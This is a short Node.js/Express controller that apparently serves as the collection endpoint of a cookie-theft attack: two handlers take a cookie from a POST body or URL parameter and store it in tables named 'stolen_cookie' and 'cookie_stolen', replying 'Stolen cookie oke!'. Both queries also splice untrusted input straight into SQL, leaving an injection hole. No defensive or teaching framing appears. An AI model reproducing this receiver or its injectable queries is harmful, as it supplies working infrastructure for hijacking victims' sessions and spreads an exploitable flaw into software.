import { db } from "../configs/database.config.js";

export const postCookie = async (req, res) => {
    try {
        const cookie = req.body.cookie;
        const query = `
            INSERT INTO stolen_cookie(content)
            VALUES ('${cookie}')
        `;

        await db.query(query);

        res.status(200).json({
            code: "success",
            message: "Stolen cookie oke!"
        })
    } catch (error) {
        console.log(error);
        res.status(400).json({
            code: "error",
            message: "Bad request"
        })
    }
}

export const pageFun = async (req, res) => {
    try {
        const cookie = req.params.id;
        const query = `
            INSERT INTO cookie_stolen (content)
            VALUES ('${cookie}')
        `;

        await db.query(query);
        res.render("funCookie")
    } catch (error) {
        console.log(error);
        res.redirect("/");
    }
}